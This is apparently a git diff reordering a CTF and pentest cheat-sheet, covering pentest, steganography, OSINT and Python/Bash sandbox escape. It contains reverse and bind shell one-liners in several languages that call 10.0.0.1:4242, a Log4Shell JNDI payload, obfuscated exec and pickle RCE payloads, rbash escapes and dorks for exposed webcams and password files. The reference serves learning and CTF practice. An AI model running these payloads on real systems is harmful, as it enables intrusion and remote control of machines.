-⇨ [Common Exploits](#common-exploits)<br>
-⇨ [Reverse Shell](#reverse-shell)<br>
-⇨ [Privilege Escalation](#privilege-escalation)<br>
-
-
-This section describes common techniques used to pentest an infrastructure. As pentesting is not the main focus of this repository, I recommend using [HackTricks](https://book.hacktricks.xyz) for more pentesting-oriented content.
-
-## Common Exploits
-
-
-
-* `Heartbleed`
-
-	Metasploit module: `auxiliary/scanner/ssl/openssl_heartbleed`
-
-	Be sure to use `set VERBOSE true` to see the retrieved results. This can often contain a flag or some valuable information.
-
-* `libssh - SSH`
-
-	`libssh0.8.1` (or others??) is vulnerable to an easy and immediate login. Metasploit module: `auxiliary/scanner/ssh/libssh_auth_bypass`. Be sure to `set spawn_pty true` to actually receive a shell! Then `sessions -i 1` to interact with the shell spawned (or whatever appropriate ID)
-
-* `Default credentials` - [CheatSheet](https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv)
-
-    Unconfigured system can use the default credentials to login.
-
-* `Log4Shell`
-
-	Exploit on the Java library **Log4j**. Malicious code is fetched and executed from a remote JNDI server. A payload looks like `${jndi:ldap://example.com:1389/a}` and need to be parsed by Log4j.
-
-	- [Simple POC](https://github.com/kozmer/log4j-shell-poc)
-	
-	- [JNDI Exploit Kit](https://github.com/pimps/JNDI-Exploit-Kit)
-
-	- [ECW2022 author's WU](https://gist.github.com/Amossys-team/e99cc3b979b30c047e6855337fec872e#web---not-so-smart-api)
-
-	- [Request Bin](https://requestbin.net/) Useful for detection and environment variable exfiltration.
-
-
-
-## Reverse Shell
-
-
-
-A [reverse shell](https://en.wikipedia.org/wiki/Shell_shoveling) is a connection initiated by the target host to the attacker listening port. For this, the target needs to be able to route to the attacker, sometimes over the internet.
-
-This is the opposite of a `bind shell`, which is a connection initiated by the attacker to the target host. This way, the attacker does not need to have a routable IP address
-
-Sometimes both types of shells are wrongly called `reverse shell`.
-
-<!--image -->
-![Reverse shell](Pentest/Reverse%20Shell/_img/rev_shell.png#gh-light-mode-only)
-![Reverse shell](Pentest/Reverse%20Shell/_img/rev_shell-dark.png#gh-dark-mode-only)
-
-
-* `PayloadAllTheThings` - [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings)
-
-    Compilation of useful payloads and bypass for Web Application Security and Pentest/CTF.
-
-* `netcat` - [Wikipedia](https://en.wikipedia.org/wiki/Netcat)
-
-    A utility for reading from and writing to network connections using TCP or UDP.
-
-    ```bash
-    Netcat classic listener
-    $ nc -nlvp 4444
-
-    # Netcat connect to listener
-    $ nc -e /bin/sh 10.0.0.1 4242
-    ```
-
-* `rlwrap` - [GitHub](https://github\.com/hanslub42/rlwrap)
-
-    Allows you to use the arrow keys in a reverse shell.
-
-    ```bash
-    $ rlwrap nc -nlvp 4444
-    ```
-
-* Upgrade a shell to a TTY shell
-
-    ```bash
-    python -c 'import pty; pty.spawn("/bin/bash")'
-    ```
-
-* `ngrok` - [Website](https://ngrok.com/)
-
-    Create a tunnel from the public internet to a port on your local machine.
-
-    ```bash
-    $ ngrok http 80 # http tunnel on local port 80
-    $ ngrok tcp 4444 # tcp tunnel on local port 4444
-    ```
-
-* Common reverse shells - [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-
-    Reverse shells connects to a remote listener. The target needs to be able to route to the attacker.
-
-    ```bash
-    # Bash
-    $ bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
-
-    # Perl
-    $ perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-
-    # Python
-    $ python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
-
-    # PHP
-    $ php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
-
-    # Ruby
-    $ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-    ```
-
-    Check [this github repository](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) for more reverse shells.
-
-* Common bind shells - [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md)
-
-    Bind shells listen on a port and wait for a connection. The attacker needs to be able to route to the target.
-
-    ```bash
-    # Netcat
-    $ nc -nlvp 4242 -e /bin/bash
-
-    # Perl
-    $ perl -e 'use Socket;$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
-
-    # Python
-    $ python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR,1);s1.bind(("0.0.0.0",4242));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
-
-    # PHP
-    $ php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",4242);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);
-    socket_write($cl,$m,strlen($m));}}'
-
-    # Ruby
-    $ ruby -rsocket -e 'f=TCPServer.new(51337);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
-    ```
-
-    Check [this github repository](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md) for more bind shells.
-
-
-
-
-
-
-## Privilege Escalation
-
-
-
-* `sudo`
-
-    First thing to check. See what the current user is allowed to do.
-    ```bash
-    sudo -l # List available commands
-    ```
-
-
-* `PEAS` <span style="color:red">❤️</span> - [GitHub](https://github\.com/carlospolop/PEASS-ng)
-
-    Find common misconfigurations and vulnerabilities in Linux and Windows.
-
-    Some payload can be found in the [Tools](Pentest/Privilege%20Escalation/Tools/PEAS/) section.
-
-    Send linpeas via ssh
-    ```bash	
-    scp linpeas.sh user@domain:/tmp
-    ```
-
-
-* setuid Files
-
-    Files with the setuid bit set are executed with the permissions of the owner of the file, not the user who started the program. This can be used to escalate privileges.
-
-    [GTFOBins](https://gtfobins.github.io/) has a list of setuid binaries that can be used to escalate privileges.
-
-    Custom setuid files can be exploited using [binary exploitation](#binary-exploitation).
-
-
-    Find files with the setuid bit set.
-    ``` bash
-    find / -perm -u=s -type f 2>/dev/null
-    ```
-
-* `CVE-2021-3156` - [Website](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156)
-
-    sudo versions before **1.9.5p2** are vulnerable to a heap-based buffer overflow. This can be exploited to gain root access. Very useful on older systems.
-
-    Some payload can be found in the [Tools](Pentest/Privilege%20Escalation/Tools/CVE-2021-3156/) section.
-
-
-
-
-<br><br>
-
-# Steganography
-
-
-
-### Online tools
-
-* `AperiSolve` <span style="color:red">❤️</span> - [Website](https://www.aperisolve.com/)
-
-	Online tool that run several steganography tools.
-
-* `Steganography Online` - [Website](http://stylesuxx.github.io/steganography/)
-
-	Online tool to hide data in images.
-
-
-### Detection tools
-
-* `Stegsolve.jar` <span style="color:red">❤️</span> - [Website](http://www.caesum.com/handbook/stego.htm) 
-
-	View the image in different colorspaces and alpha channels. I recommend using [this patched version](https://github.com/Giotino/stegsolve) to be able to zoom out.
-
-* `zsteg` <span style="color:red">❤️</span> - [GitHub](https://github\.com/zed-0xff/zsteg)
-
-	Command-line tool for **PNG** and **BMP** steganography.
-
-* `jsteg` - [GitHub](https://github\.com/lukechampine/jsteg)
-
-    Command-line tool for **JPEG** steganography.
-
-* [Jstego](https://sourceforge.net/projects/jstego/)
-
-    GUI tool for **JPG** steganography.
-
-* `exiftool` <span style="color:red">❤️</span> - [Website](https://exiftool.org/)
-
-	Tool to view and edit metadata in files.
-
-
-### Image steaganography implementations
-
-Many steganography implementations exists. Here is a list of some of them. 
-
-* `steghide` - [Website](http://steghide.sourceforge.net/)
-
-	Hide data in various kinds of image- and audio-files using a passphrase. The password can be empty.
-
-* `StegCracker` - [GitHub](https://github.com/Paradoxis/StegCracker)
-
-	Brute force passphrases for steghide encrypted files. Different data can have different passphrases.
-
-* `StegSeek` - [GitHub](https://github.com/RickdeJager/stegseek)
-
-	Faster than `stegcracker`.
-
-* `steg_brute.py` - [GitHub](https://github\.com/Va5c0/Steghide-Brute-Force-Tool)
-
-	This is similar to `stegcracker`.
-
-* `stepic` - [Website](http://domnit.org/stepic/doc/)
-
-	Python library to hide data in images.
-
-* `Digital Invisible Ink Tool` - [Website](http://diit.sourceforge.net/)
-
-	A Java steganography tool that can hide any sort of file inside a digital image (regarding that the message will fit, and the image is 24 bit color)
-
-* `ImageHide` - [Website](https://www.softpedia.com/get/Security/Encrypting/ImageHide.shtml)
-
-	Hide any data in the LSB of an image. Can have a password.
-
-* `stegoVeritas` - [GitHub](https://github.com/bannsec/stegoVeritas/)
-
-	CLI tool to extract data from images.
-
-* Online LSB Tools
-
-	Some online tools to hide data in the LSB of images.
-
-	[https://manytools.org/hacker-tools/steganography-encode-text-into-image/](https://manytools.org/hacker-tools/steganography-encode-text-into-image/) Only supports PNG
-	[https://stylesuxx.github.io/steganography/](https://stylesuxx.github.io/steganography/)
-
-* `hipshot` - [Website](https://bitbucket.org/eliteraspberries/hipshot)
-
-	A python tool to hide a video in an image.
-
-### Data hidden in the data format
-
-#### Images
-
-* [`APNG`]
-
-	Animated PNG. Use (apngdis)[https://sourceforge.net/projects/apngdis/] to extract the frames and delays.
-
-* `SVG Layers`
-
-	Data can be hidden under SVG layers. `inkview` can be used to view and toggle the layers.
-
-* `Image thumbnails`
-
-	Image thumbnails can be different from the image itself.
-	```
-	exiftool -b -ThumbnailImage my_image.jpg > my_thumbnail.jpg
-	```
-
-* Corrupted image files
-
-	See `Images` in the `Forensics` section.
-
-#### Text
-
-* Unicode Steganography / Zero-Width Space Characters
-
-	Messages can be hidden in the unicode characters. For example using the zero-width space character in it. Use a modern IDE like [Code](https://code.visualstudio.com/) to find these characters.
-
-* Whitespace
-
-	Tabs and spaces (for example in the indentation) can hide data. Some tools can find it: [`snow`](http://www.darkside.com.au/snow/) or an esoteric programming language interpreter: [https://tio.run/#whitespace](https://tio.run/#whitespace)
-
-* `snow` - [Website](http://www.darkside.com.au/snow/)
-
-	A command-line tool for whitespace steganography.
-
-
-#### Audio
-
-* `spectrogram` - [Wikipedia](https://en.wikipedia.org/wiki/Spectrogram)
-
-	An image can be hidden in the spectrogram of an audio file. [`audacity`](https://www.audacityteam.org/) can show the spectrogram of an audio file. (To select Spectrogram view, click on the track name (or the black triangle) in the Track Control Panel which opens the Track Dropdown Menu, where the spectrogram view can be selected.. )
-
-* `XIAO Steganography` - [Website](https://xiao-steganography.en.softonic.com/)
-
-	Windows software to hide data in audio.
-
-* `DTMF` - [Wikipedia](https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling).
-
-	Dual tone multi-frequency is a signaling system using the voice-frequency band over telephone lines. It can be used to send text messages over the phone. Some tool: [Detect DTMF Tones](http://dialabc.com/sound/detect/index.html) 
-	
-#### QR codes
-
-* `QR code` - [Wikipedia](https://en.wikipedia.org/wiki/QR_code) 
-	
-	Square barcode that can store data.
-
-* `zbarimg` - [Website](https://linux.die.net/man/1/zbarimg)
-
-	CLI tool to scan QR codes of different types.
-<br><br>
-
-# OSINT
-
-⇨ [Username](#username)<br>
-⇨ [Email](#email)<br>
-⇨ [Dorking](#dorking)<br>
-⇨ [Images](#images)<br>
-⇨ [Map](#map)<br>
-
-
-* `Wayback machine` - [Website](https://archive.org/)
-
-    Find old/previous versions of a website.
-
-## Username
-
-
-
-* `Sherlock` - [GitHub](https://github\.com/sherlock-project/sherlock)
-
-    Python script to search for usernames across social networks.
-
-
-
-
-## Email
-
-
-
-* `Epieos` - [Website](https://epieos.com)
-
-    Find information about an email.
-
-
-* `gmail address`
-
-    A gmail address can be used to query public information on google services like Google Maps reviews or Google Calendar events. [Epieos](https://epieos.com) can find such services.
-
-
-
-
-
-## Dorking
-
-
-
-Dorking is the process of using search engines to find information about a target.
-
-
-* `Google Dorks` - [Wikipedia](https://en.wikipedia.org/wiki/Google_hacking) [CheatSheet](https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06) 
-
-    Use Google's search engine to find indexed pages that contain specific information.
-    provides detailed information about Google Dorks.
-
-    The most common ones are:
-    ```bash
-    site:example.com           # Search for a specific domain
-    inurl: "ViewerFrame?Mode=" # Search for a specific string in the URL (exposed webcams)
-    intitle: "index of"        # Search for a specific string in the title of the page (exposed dirs)
-    filetype:pdf               # Search for a specific file type
-    ```
-
-* `Github Dorks`
-
-    Use Github's search engine to find indexed files that contain specific information. [This documentation](https://docs.github.com/en/search-github/searching-on-github) can be used to craft search queries.
-
-    Github users can be tracked using [Gitive](https://github.com/mxrch/GitFive).
-
-    The most common dork keywords are:
-    ```bash
-    filename:passwords.txt     # Search for a specific filename
-    extension:txt              # Search for a specific file extension
-    owner:username             # Search for a specific username
-    
-    # In commits
-    author-name:username       # Search for a specific commit author
-    author-email:u@ex.com      # Search for a specific commit author email
-    committer-name:username    # Search for a specific committer
-    committer-email:u@ex.com   # Search for a specific committer email
-    ```
-
-    
-
-
-
-## Images
-
-
-
-* `EXIF data`
-
-    Metadata of images can be used to find information about the image, such as the location where it was taken, the device used to take the picture, etc.
-
-    Use [exiftool](https://exiftool.org/) to extract metadata from images.
-
-* `Reverse image search` - [Website](https://images.google.fr/)
-
-    Search by image. Can be used to find similar images, or to find the source of an image. Here are the most common search engines:
-
-    | Search engine | Description |
-    | --- | --- |
-    | [Google Lens](https://images.google.fr/) | The most popular one. Can be used to search quickly parts of an image. |
-    | [Bing Images](https://www.bing.com/images) | Microsoft's search engine. |
-    | [TinEye](https://tineye.com/) | Reverse image search engine. Very useful to search the exact same image on the internet. |
-    | [Yandex](https://yandex.com/images/) | Russian search engine. Can be used to find images that are not indexed by Google. |
-
-    
-
-
-
-## Map
-
-
-
-* `What 3 words` - [Website](https://what3words.com/)
-
-    Associate 3 words to a location on earth. 
-
-    To be kept in mind for OSINT challenges.
-
-* `Guess location from Images/Google Steet view`
-
-    Several websites such as [Geohints](https://geohints.com) can help find location from Google Street view, or even general images.
-
-* `Google street view`
-
-    Google street view can be used to find location from images. 
-
-    It can also be used to find information about a location, such as the name of a shop or a restaurant.
-    
-
-* `ADS-B` - [Wikipedia](https://en.wikipedia.org/wiki/Automatic_Dependent_Surveillance%E2%80%93Broadcast)
-
-    ADS-B is a technology used by air-crafts to broadcast their position. 
-
-    This information can be used to find information about a flight, such as the departure and arrival airports, the flight number, etc.
-
-    [adsbexchange.com](https://globe.adsbexchange.com) can be used to find free public ADS-B data.
-
-
-<br><br>
-
-# Jail Break
-
-⇨ [Python](#python)<br>
-⇨ [Bash](#bash)<br>
-⇨ [Latex](#latex)<br>
-
-
-
-
-## Python
-
-
-
-* Python 3 builtin functions/constants - [Website](https://docs.python.org/3/library/functions.html)
-
-    Python's builtin functions and constants provide a lot of useful information about the program's environment. Here are the most useful ones:
-
-    | Function | Description |
-    | --- | --- |
-    | `dir()` | Without arguments, return the list of names in the current local scope. With an argument, attempt to return a list of valid attributes for that object. |
-    | `vars()` | List variables and their value in the current scope with a dict object |
-    | `help()` | Invoke the built-in help system. Can be used to execute commands for example in `help(help)` you just need to type `!ls` to execute `ls` |
-    | `globals()` | Returns a dict object containing all global variables |
-    | `locals()` | Returns a dict object containing all local variables |
-
-
-* `exec`
-
-    `exec` runs python code from a string. If the user can control the string, it can be used to execute arbitrary code.
-
-    ```python
-    exec("__import__('os').system('ls')") # List files
-    exec("open('flag.txt').read()")       # Read flag.txt
-
-    # Reverse shell to 10.0.0.1:4242
-    exec('socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")') 
-    ```
-
-* `eval`
-
-    `eval` evaluates a python expression from a string. It can also be used to execute arbitrary code, but does not allow for multiple statements. (with ';' or '\n')
-
-    ```python
-    eval("__import__('os').system('ls')") # List files
-    eval("open('flag.txt').read()")       # Read flag.txt
-    eval("(a:=globals())") # Walrus operator trick to assign globals() to a variable and return it
-    ```
-    
-* Command obfuscation
-
-    * Unicode
-
-        Python keywords can be written in unicode. For example, `exec` can be written as `eｘec`. This very useful to bypass filters.
-
-        ```python
-        def find_unicode_variant(s):
-            result = ""
-            for c in s:
-                offset = ord(c) - ord('A')
-                result += chr(0xff21 + offset)
-            return result
-        ```
-
-        Note: Unicode characters take more than a single byte to be represented in an encoded format. For example `ｘ` is represented by the bytes `ef bd 98`. This can be a problem if the input is filtered to remove non ascii characters or if the size of the input is limited.
-
-    * Hex
-
-        If the input is filtered before being passed to python, the hex representation can be used to bypass the filter.
-
-        ```python
-        exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29") # eval("__import__('os').system('ls')")
-        ```
-
-        Note: This does not work when the filter is in python since this string is strictly equivalent to `"__import__('os').system('ls')"`
-
-    * Ocal
-
-        Same as hex, it is an alternative representation of python strings.
-
-        ```python
-        exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51") # eval("__import__('os').system('ls')")
-        ```
-
-
-* Escape sandbox environment
-
-    When the environment is sandboxed, some functions are not directly available. Global variables can be used to access them.
-
-    ```python
-    ().__class__.__base__.__subclasses__() # Gives access to `object` subclasses
-
-* Python's 2 input() function
-
-    `python2`'s `input()` function is equivalent to `eval(raw_input())` in python3. So, you can execute arbitrary python expressions.
-
-    ```python
-    open("/tmp/out.txt", "w").write(open(".passwd").readline().strip())
-    ```
-
-* Pickle deserialization injection
-
-    `pickle.loads` can execute code when deserializing a user provided string.
-
-    ```python
-    class rce():
-        def __reduce__(self):
-            import os
-            return (os.system, ('ls',))
-    payload_bytestring = pickle.dumps(rce())
-    ```
-
-* Python libraries that can execute commands
-
-    Some python libraries allows for code/command execution when provided with unsanitized input. Here are the most common ones:
-
-    ```python
-    df.query('@__builtins__.__import__("os").system("ls")') # Pandas dataframe
-    subprocess.call("ls", shell=True)
-    subprocess.Popen("ls", shell=True)
-    pty.spawn("ls")
-    pty.spawn("/bin/bash")
-    ```
-
-* When calls are disabled
-
-    WHen calls are disabled, an attacker can use decorators still execute code.
-
-    ```python
-    # equivalent to X = exec(input(X))
-    @exec
-    @input
-    class X:
-        pass
-    ```
-
-
-    [Google CTF challenge](https://ctftime.org/task/22891)
-
-
-
-
-## Bash
-
-
-
-* Missing `ls` or `dir` commands
-
-	If you cannot run `ls`, `dir`, `find` nor `grep` to list files you can use
-
-	```
-	echo *
-	echo /any/path/*
-	```
-
-
-* restricted bash (`rbash`) - [GitHub Gist](https://gist.github.com/PSJoshi/04c0e239ac7b486efb3420db4086e290)
-
-	`rbash` is a shell with restriction features. Misconfigured `rbash` can be bypassed.
-
-	```bash
-    # List available commands
-    compgen -c
-
-    # Run bash without profiles (when rbash is initialized in .bashrc)
-    bash --noprofile
-
-    # Read files
-	mapfile -t  < /etc/passwd
-	printf "$s\n" "${anything[@]}"
-	```
-
-* shell from provided commands - [Website](https://gtfobins.github.io/)
-
-    Some commands/binaries allows to pop a shell. Use [GTFOBins](https://gtfobins.github.io/) to find them. Here are the most common ones:
-
-    | Command | Description |
-    | --- | --- |
-    | less | `!/bin/sh` |
-    | vim | `:!/bin/sh` |
-
-
-
-
-## Latex
-
-
-
-
-
-
-<br><br>
-
 # Web
 
 ⇨ [Enumeration](#enumeration)<br>
@@ -3087,15 +2410,797 @@ Server Side Template Injection (SSTI) is a vulnerability that allows an attacker
 
 <br><br>
 
+# Pentest
+
+⇨ [Common Exploits](#common-exploits)<br>
+⇨ [Privilege Escalation](#privilege-escalation)<br>
+⇨ [Reverse Shell](#reverse-shell)<br>
+
+
+This section describes common techniques used to pentest an infrastructure. As pentesting is not the main focus of this repository, I recommend using [HackTricks](https://book.hacktricks.xyz) for more pentesting-oriented content.
+
+## Common Exploits
+
+
+
+* `Heartbleed`
+
+	Metasploit module: `auxiliary/scanner/ssl/openssl_heartbleed`
+
+	Be sure to use `set VERBOSE true` to see the retrieved results. This can often contain a flag or some valuable information.
+
+* `libssh - SSH`
+
+	`libssh0.8.1` (or others??) is vulnerable to an easy and immediate login. Metasploit module: `auxiliary/scanner/ssh/libssh_auth_bypass`. Be sure to `set spawn_pty true` to actually receive a shell! Then `sessions -i 1` to interact with the shell spawned (or whatever appropriate ID)
+
+* `Default credentials` - [CheatSheet](https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv)
+
+    Unconfigured system can use the default credentials to login.
+
+* `Log4Shell`
+
+	Exploit on the Java library **Log4j**. Malicious code is fetched and executed from a remote JNDI server. A payload looks like `${jndi:ldap://example.com:1389/a}` and need to be parsed by Log4j.
+
+	- [Simple POC](https://github.com/kozmer/log4j-shell-poc)
+	
+	- [JNDI Exploit Kit](https://github.com/pimps/JNDI-Exploit-Kit)
+
+	- [ECW2022 author's WU](https://gist.github.com/Amossys-team/e99cc3b979b30c047e6855337fec872e#web---not-so-smart-api)
+
+	- [Request Bin](https://requestbin.net/) Useful for detection and environment variable exfiltration.
+
+
+
+## Privilege Escalation
+
+
+
+* `sudo`
+
+    First thing to check. See what the current user is allowed to do.
+    ```bash
+    sudo -l # List available commands
+    ```
+
+
+* `PEAS` <span style="color:red">❤️</span> - [GitHub](https://github\.com/carlospolop/PEASS-ng)
+
+    Find common misconfigurations and vulnerabilities in Linux and Windows.
+
+    Some payload can be found in the [Tools](Pentest/Privilege%20Escalation/Tools/PEAS/) section.
+
+    Send linpeas via ssh
+    ```bash	
+    scp linpeas.sh user@domain:/tmp
+    ```
+
+
+* setuid Files
+
+    Files with the setuid bit set are executed with the permissions of the owner of the file, not the user who started the program. This can be used to escalate privileges.
+
+    [GTFOBins](https://gtfobins.github.io/) has a list of setuid binaries that can be used to escalate privileges.
+
+    Custom setuid files can be exploited using [binary exploitation](#binary-exploitation).
+
+
+    Find files with the setuid bit set.
+    ``` bash
+    find / -perm -u=s -type f 2>/dev/null
+    ```
+
+* `CVE-2021-3156` - [Website](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156)
+
+    sudo versions before **1.9.5p2** are vulnerable to a heap-based buffer overflow. This can be exploited to gain root access. Very useful on older systems.
+
+    Some payload can be found in the [Tools](Pentest/Privilege%20Escalation/Tools/CVE-2021-3156/) section.
+
+
+
+
+
+## Reverse Shell
+
+
+
+A [reverse shell](https://en.wikipedia.org/wiki/Shell_shoveling) is a connection initiated by the target host to the attacker listening port. For this, the target needs to be able to route to the attacker, sometimes over the internet.
+
+This is the opposite of a `bind shell`, which is a connection initiated by the attacker to the target host. This way, the attacker does not need to have a routable IP address
+
+Sometimes both types of shells are wrongly called `reverse shell`.
+
+<!--image -->
+![Reverse shell](Pentest/Reverse%20Shell/_img/rev_shell.png#gh-light-mode-only)
+![Reverse shell](Pentest/Reverse%20Shell/_img/rev_shell-dark.png#gh-dark-mode-only)
+
+
+* `PayloadAllTheThings` - [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings)
+
+    Compilation of useful payloads and bypass for Web Application Security and Pentest/CTF.
+
+* `netcat` - [Wikipedia](https://en.wikipedia.org/wiki/Netcat)
+
+    A utility for reading from and writing to network connections using TCP or UDP.
+
+    ```bash
+    Netcat classic listener
+    $ nc -nlvp 4444
+
+    # Netcat connect to listener
+    $ nc -e /bin/sh 10.0.0.1 4242
+    ```
+
+* `rlwrap` - [GitHub](https://github\.com/hanslub42/rlwrap)
+
+    Allows you to use the arrow keys in a reverse shell.
+
+    ```bash
+    $ rlwrap nc -nlvp 4444
+    ```
+
+* Upgrade a shell to a TTY shell
+
+    ```bash
+    python -c 'import pty; pty.spawn("/bin/bash")'
+    ```
+
+* `ngrok` - [Website](https://ngrok.com/)
+
+    Create a tunnel from the public internet to a port on your local machine.
+
+    ```bash
+    $ ngrok http 80 # http tunnel on local port 80
+    $ ngrok tcp 4444 # tcp tunnel on local port 4444
+    ```
+
+* Common reverse shells - [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+
+    Reverse shells connects to a remote listener. The target needs to be able to route to the attacker.
+
+    ```bash
+    # Bash
+    $ bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+
+    # Perl
+    $ perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+    # Python
+    $ python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+
+    # PHP
+    $ php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+    # Ruby
+    $ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+    ```
+
+    Check [this github repository](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) for more reverse shells.
+
+* Common bind shells - [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md)
+
+    Bind shells listen on a port and wait for a connection. The attacker needs to be able to route to the target.
+
+    ```bash
+    # Netcat
+    $ nc -nlvp 4242 -e /bin/bash
+
+    # Perl
+    $ perl -e 'use Socket;$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
+
+    # Python
+    $ python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR,1);s1.bind(("0.0.0.0",4242));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+
+    # PHP
+    $ php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",4242);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);
+    socket_write($cl,$m,strlen($m));}}'
+
+    # Ruby
+    $ ruby -rsocket -e 'f=TCPServer.new(51337);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
+    ```
+
+    Check [this github repository](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md) for more bind shells.
+
+
+
+
+
+<br><br>
+
+# Jail Break
+
+⇨ [Latex](#latex)<br>
+⇨ [Python](#python)<br>
+⇨ [Bash](#bash)<br>
+
+
+
+
+## Latex
+
+
+
+
+
+
+
+## Python
+
+
+
+* Python 3 builtin functions/constants - [Website](https://docs.python.org/3/library/functions.html)
+
+    Python's builtin functions and constants provide a lot of useful information about the program's environment. Here are the most useful ones:
+
+    | Function | Description |
+    | --- | --- |
+    | `dir()` | Without arguments, return the list of names in the current local scope. With an argument, attempt to return a list of valid attributes for that object. |
+    | `vars()` | List variables and their value in the current scope with a dict object |
+    | `help()` | Invoke the built-in help system. Can be used to execute commands for example in `help(help)` you just need to type `!ls` to execute `ls` |
+    | `globals()` | Returns a dict object containing all global variables |
+    | `locals()` | Returns a dict object containing all local variables |
+
+
+* `exec`
+
+    `exec` runs python code from a string. If the user can control the string, it can be used to execute arbitrary code.
+
+    ```python
+    exec("__import__('os').system('ls')") # List files
+    exec("open('flag.txt').read()")       # Read flag.txt
+
+    # Reverse shell to 10.0.0.1:4242
